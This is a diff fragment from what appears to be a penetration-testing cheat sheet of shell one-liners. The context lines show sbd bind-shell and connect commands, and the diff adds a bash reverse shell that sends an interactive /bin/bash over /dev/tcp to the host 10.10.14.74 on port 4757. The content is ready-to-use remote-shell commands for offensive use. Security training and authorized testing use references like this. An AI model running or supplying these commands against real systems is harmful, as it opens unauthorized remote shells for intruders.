@@ -241,6 +241,13 @@ sbd -lp 4444 -k secret -e /bin/bash
 sbd -k secret 127.0.0.1 4444
 ```
 
+* Bash Shell
+
+```
+/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.74/4757 0>&1"
+```
+
+
 * Socat Shells
 
 ```
